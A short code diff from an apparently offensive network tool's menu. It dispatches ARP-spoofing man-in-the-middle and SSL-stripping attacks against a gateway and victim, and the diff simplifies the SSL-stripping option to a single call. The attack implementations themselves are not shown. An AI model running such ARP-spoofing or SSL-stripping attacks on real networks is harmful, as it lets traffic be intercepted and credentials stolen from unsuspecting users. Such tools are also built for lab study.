@@ -54,16 +54,8 @@ def main():
     elif attack.lower() == "d":
         arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
     elif attack.lower() == "e":
-        print("MITM ...")
-        arp_thread = threading.Thread(target=arp_mitm_gateway.spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
-        arp_thread.start()
-
         print("SSL Stripping...")
-        ssl_thread = threading.Thread(target=ssl_strip.ssl_strip, args=(interfaceNAT,))
-        ssl_thread.start()
-
-        arp_thread.join()
-        ssl_thread.join()
+        ssl_strip.ssl_strip(interfaceNAT)
 
     else:
         print("Unknown command: {}. Use either 'A', 'B', 'C', 'D', or 'E'".format(attack))
